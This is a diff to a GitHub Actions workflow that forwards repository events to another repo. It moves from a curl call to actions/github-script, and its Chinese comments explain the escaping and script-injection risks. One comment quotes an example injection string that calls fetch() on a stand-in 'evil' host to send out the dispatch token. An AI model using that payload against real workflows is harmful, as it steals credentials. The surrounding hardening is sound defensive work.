@@ -3,7 +3,7 @@ name: forward-to-forge
 # 本 workflow 只做一件事：把事件原样转告 forge。
 # 硬规矩（细则见 market-spec/03 §2.6）：
 #   1. 不 checkout —— 没有任何仓库内容进入执行环境（包括 issue 正文）
-#   2. run: 里零 ${{ }} 插值 —— 外部值全部走 env:（${{ }} 在 run: 里是文本拼接，会脚本注入）
+#   2. run:/script: 里零 ${{ }} 插值 —— 外部值全部走 env:（${{ }} 在那里是文本拼接，会脚本注入）
 #   3. 跳过在 job 级 —— 被跳过的 job 根本拿不到 secret（这里没有权限门禁，见下）
 #   4. 转发的是「信标」不是「数据」—— 只带事件名/issue 号/tag/sha，内容由 forge 自己用 API 读
 
@@ -38,24 +38,46 @@ jobs:
     if: github.event_name != 'push' || !contains(github.event.head_commit.message, '[skip-dispatch]')
     steps:
       - name: Dispatch forge
+        # GitHub 官方的 API 客户端 action（node24，无第三方依赖树）。选它而不是
+        # 手写 curl，是为了让 payload 走 octokit 的 JSON 序列化：老写法里
+        # `"releaseTag":"%s"` 是**没有转义**的，而 git 的 refname 规则禁空格、
+        # `~^:?*[\`、`..`、`@{`，**却不禁止 `"`** —— 一个叫 `v1.0"x` 的 tag
+        # 就能把那串 JSON 拼坏。顺带白拿指数退避重试。
+        uses: actions/github-script@v9
         env:
+          # ⚠️ 一切外部数据只经 env 传入；script: 里**一处 ${{ }} 都没有**。
+          # script: 不是 shell，但 ${{ }} 在这里同样是**文本拼接** —— 往里面塞
+          # 一个 `'); fetch('https://evil/?'+process.env.DISPATCH_TOKEN); //`
+          # 效果和在 run: 里注入完全一样。这是硬规矩 2，不是 shell 专属的规矩。
           DISPATCH_TOKEN: ${{ secrets.GH_PAT }}
           GH_EVENT: ${{ github.event_name }}
           ISSUE_NUMBER: ${{ github.event.issue.number }}
           RELEASE_TAG: ${{ github.event.release.tag_name }}
           RELEASE_PRERELEASE: ${{ github.event.release.prerelease }}
-          REPO: ${{ github.repository }}
           REF: ${{ github.ref }}
           SHA: ${{ github.sha }}
-        run: |
-          set -euo pipefail
-          echo "::add-mask::$DISPATCH_TOKEN"
-          payload=$(printf '{"event_type":"store-event","client_payload":{%s}}' \
-            "$(printf '"event":"%s","issue":%s,"releaseTag":"%s","prerelease":"%s","repo":"%s","ref":"%s","sha":"%s"' \
-               "$GH_EVENT" "${ISSUE_NUMBER:-0}" "$RELEASE_TAG" "$RELEASE_PRERELEASE" "$REPO" "$REF" "$SHA")")
-          curl -sS --fail-with-body -X POST \
-            -H "Authorization: Bearer $DISPATCH_TOKEN" \
-            -H "Accept: application/vnd.github+json" \
-            -H "X-GitHub-Api-Version: 2022-11-28" \
-            https://api.github.com/repos/market-of-labs/forge/dispatches \
-            -d "$payload"
+        with:
+          # 走 PAT：GITHUB_TOKEN 不能跨仓库（§6.2 不变量 1）。
+          github-token: ${{ secrets.GH_PAT }}
+          # 瞬时 5xx 指数退避重试。401/403/404/422 按 action 默认值**不**重试 ——
+          # 那些重试也没用（token 错就是错），只会把一次失败拖成四次。
+          retries: 3
+          script: |
+            // 与老写法里的 `echo "::add-mask::"` 等价。GitHub 本就会自动遮蔽
+            // secrets.* 的值，这里显式再来一次，是为了不去依赖"自动遮蔽"这个行为。
+            core.setSecret(process.env.DISPATCH_TOKEN)
+
+            await github.rest.repos.createDispatchEvent({
+              owner: 'market-of-labs',
+              repo: 'forge',
+              event_type: 'store-event',
+              client_payload: {
+                event: process.env.GH_EVENT,
+                issue: Number(process.env.ISSUE_NUMBER || 0),
+                releaseTag: process.env.RELEASE_TAG || '',
+                prerelease: process.env.RELEASE_PRERELEASE || '',
+                repo: `${context.repo.owner}/${context.repo.repo}`,
+                ref: process.env.REF || '',
+                sha: process.env.SHA || '',
+              },
+            })
